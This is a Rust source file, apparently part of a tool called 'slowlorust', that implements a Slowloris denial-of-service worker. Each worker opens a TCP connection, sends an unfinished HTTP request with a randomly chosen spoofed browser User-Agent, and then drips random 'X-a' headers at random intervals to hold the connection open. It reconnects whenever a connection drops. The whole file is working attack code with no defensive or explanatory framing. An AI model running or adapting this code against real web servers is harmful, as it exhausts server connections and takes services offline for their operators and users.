use rand::rngs::SmallRng;
use rand::{FromEntropy, Rng};
use std::io::{Error, Write};
use std::net::TcpStream;
use std::thread;
use std::time::Duration;

const USER_AGENTS: [&str; 10] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1",
    "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01"
];

pub struct Worker {
    id: u16,
    conn: String,
    header_count: u8,
    sleep_bounds: (u8, u8),
    verbose: i32,
    rng: SmallRng,
    stream: TcpStream,
}

impl Worker {
    pub fn new(id: u16, conn: String, header_count: u8, sleep_bounds: (u8, u8), verbose: i32) -> Result<Worker, Error> {
        let mut stream = TcpStream::connect(&conn)?;
        let mut rng = SmallRng::from_entropy();
        stream.write_all(
            format!(
                "GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n",
                rng.gen::<u64>(),
                USER_AGENTS[rng.gen_range(0, USER_AGENTS.len())]
            )
            .as_bytes(),
        )?;

        Ok(Worker {
            id,
            sleep_bounds,
            header_count,
            conn,
            verbose,
            rng,
            stream,
        })
    }

    pub fn start(&mut self) {
        let mut sent = 0;
        loop {
            thread::sleep(Duration::from_secs(
                self.rng.gen_range(self.sleep_bounds.0, self.sleep_bounds.1) as u64
            ));
            if sent >= self.header_count
                || self
                    .stream
                    .write_all(format!("X-a: {}\r\n", &self.rng.gen::<u64>()).as_bytes())
                    .is_err()
            {
                if let Ok(worker) = Worker::new(self.id, self.conn.clone(), self.header_count, self.sleep_bounds, self.verbose) {
                    if self.verbose > 0 {
                        warn!("[slowlorust_{:03}] Recreating.", self.id);
                    }
                    *self = worker;
                    // Avoid nested loops
                    break;
                }
            } else {
                info!("[slowlorust_{:03}] Data send success.", self.id);
                sent += 1;
            }
        }
        self.start();
    }
}
